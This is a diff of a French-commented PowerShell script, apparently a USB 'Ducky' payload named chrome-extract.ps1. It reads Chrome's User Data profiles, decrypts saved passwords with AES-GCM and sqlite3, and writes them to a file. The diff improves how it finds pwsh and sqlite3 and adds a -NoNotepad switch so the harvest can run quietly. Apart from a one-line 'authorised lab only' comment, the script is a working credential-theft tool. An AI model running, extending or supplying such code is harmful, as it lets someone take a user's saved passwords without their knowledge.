@@ -1,13 +1,37 @@
 # Lab / machine autorisee uniquement. Cibles Google Chrome (Chromium).
 # Utilise pwsh 7+ (AesGcm) et sqlite3 dans PATH.
 param(
-    [string]$ScriptSourceUrl = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/chrome-extract.ps1'
+    [string]$ScriptSourceUrl = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/chrome-extract.ps1',
+    [switch]$NoNotepad
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
 
+function Find-LeonardoPwsh {
+    $c = Get-Command pwsh -ErrorAction SilentlyContinue
+    if ($c) { return $c.Source }
+    $p = Join-Path ${env:ProgramFiles} 'PowerShell\7\pwsh.exe'
+    if (Test-Path -LiteralPath $p) { return $p }
+    return $null
+}
+
+function Find-Sqlite3 {
+    $c = Get-Command sqlite3 -ErrorAction SilentlyContinue
+    if ($c) { return $c.Source }
+    $guess = @(
+        (Join-Path $env:USERPROFILE 'miniconda3\Library\bin\sqlite3.exe')
+        (Join-Path $env:USERPROFILE 'anaconda3\Library\bin\sqlite3.exe')
+        'C:\ProgramData\chocolatey\bin\sqlite3.exe'
+        (Join-Path $env:LOCALAPPDATA 'Microsoft\WinGet\Links\sqlite3.exe')
+    )
+    foreach ($p in $guess) {
+        if ($p -and (Test-Path -LiteralPath $p)) { return $p }
+    }
+    return $null
+}
+
 if ($PSVersionTable.PSVersion.Major -lt 7) {
-    $pwsh = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
+    $pwsh = Find-LeonardoPwsh
     if (-not $pwsh) { throw 'PowerShell 7 requis (AesGcm). Installe pwsh ou lance via leonardo-plan-a.ps1.' }
     $self = $MyInvocation.MyCommand.Path
     if (-not $self -or -not (Test-Path -LiteralPath $self)) {
@@ -64,8 +88,8 @@ function Unlock-ChromePassword {
     }
 }
 
-$sqlite = (Get-Command sqlite3 -ErrorAction SilentlyContinue | Select-Object -First 1).Source
-if (-not $sqlite) { throw 'sqlite3 introuvable dans PATH.' }
+$sqlite = Find-Sqlite3
+if (-not $sqlite) { throw 'sqlite3 introuvable (PATH ou emplacements connus).' }
 
 $userData = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
 if (-not (Test-Path -LiteralPath $userData)) { throw 'Chrome User Data introuvable.' }
@@ -124,5 +148,5 @@ foreach ($prof in $profiles) {
 }
 
 $lines | Set-Content -LiteralPath $out -Encoding utf8
-Start-Process notepad.exe -ArgumentList $out
+if (-not $NoNotepad) { Start-Process notepad.exe -ArgumentList $out }
 Write-Output $out
